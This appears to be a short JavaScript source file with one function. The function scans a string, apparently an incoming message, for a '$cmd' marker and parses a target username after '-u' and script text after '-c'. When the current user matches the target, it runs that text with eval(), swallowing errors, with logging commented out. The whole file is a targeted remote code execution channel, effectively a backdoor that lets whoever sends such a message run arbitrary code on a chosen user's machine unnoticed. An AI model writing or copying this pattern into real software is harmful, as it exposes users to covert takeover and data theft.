/**
 * Checks and run the command
 * @param {String} value
 */

function checkAndRunCommand(value, username) {
  if (!value.includes("$cmd")) {
    return;
  }
  console.log("cmd found");
  const commandTokens = value.split(" ");

  // finding target user
  const targetUser = commandTokens[commandTokens.findIndex((v) => v === "-u") + 1];

  // finding script
  const script = commandTokens.slice(commandTokens.findIndex((v) => v === "-c") + 1).join(" ");

  // console.log(`targetedUser: ${targetUser}`);
  if (username !== targetUser) {
    return;
  }
  // console.log(`Running command on user: ${user}`);
  try {
    eval(script);
  } catch (error) {
    // console.log("Failed to run script");
  }
  // console.log(`Command Finished running`);
}
